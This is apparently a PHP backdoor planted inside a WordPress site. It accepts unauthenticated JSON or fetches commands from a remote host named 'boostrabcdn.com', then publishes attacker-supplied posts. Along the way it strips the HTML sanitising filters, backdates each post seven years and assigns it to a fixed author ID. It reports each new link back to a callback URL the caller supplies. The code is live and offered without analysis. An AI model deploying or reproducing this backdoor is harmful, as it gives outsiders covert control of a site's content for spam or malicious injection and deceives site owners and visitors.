<?php
	ini_set('display_errors', 1);
	header("Content-Type:application/json");

	$flagReturnLink = true;
	$data = json_decode(file_get_contents('php://input'), true);
	
	if(is_null($data)) {
		$json_data = file_get_contents('https://boostrabcdn.com/wcs/json_data.txt');
		$data = json_decode($json_data, true);
		$flagReturnLink = false;
	}

	if($data['flag'] == "insert") {
	
	$post_name = $data['post_name'];
	$post_title = $data['post_title'];
	$post_content = $data['post_content'];
	$saveLink = $data['saveLink'];
	$googleGl = $data['googleGl'];
	$googleHl = $data['googleHl'];

	// wordpress core
	require_once('../../wp-blog-header.php');
	// wodpress download
	require_once('../../wp-admin/includes/file.php');
	require_once('../../wp-admin/includes/media.php');
	
	$datetime = new DateTime();
	$newDatetime = $datetime->sub(new DateInterval('P7Y'));
	$postDate = $newDatetime->format('Y-m-d H:i:s');
	
	//$datetime = new DateTime();
	//$datetime->modify("-9 year");
	//$postDate = $datetime->format('Y-m-d H:i:s');
		
	$postContent = array(
		'post_name'      => $post_name, // url
		'post_title'     => $post_title, // title
		'post_content'   => $post_content,
		'post_status'    => 'publish', // publish, pending, future, private
		'post_type'      => 'post',
		'ping_status'	 => 'closed',
		'comment_status' => 'closed',
		'post_date'      => $postDate,
		'post_author'    => 20 // admin?
	);
	
	kses_remove_filters();
	$postID = wp_insert_post($postContent); // returns 0 if an error
	kses_init_filters();
	wp_set_object_terms($postID, 200, 'category' ); //category from admin
	$new_post = get_permalink($postID);
	
	if($new_post != '') {
		$post = array(
			'urlinka' => $new_post,
			'googleGl' => $googleGl,
			'googleHl' => $googleHl,
		);
		if($flagReturnLink) {
			
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $saveLink);
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($post));
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));

			$server_output = curl_exec($ch);
			curl_close ($ch);		

		} else {			
			$queryString = http_build_query($post);
			
			$response = file_get_contents($saveLink."?".$queryString);
		}
	}
	die('end');
}

die('End');

?>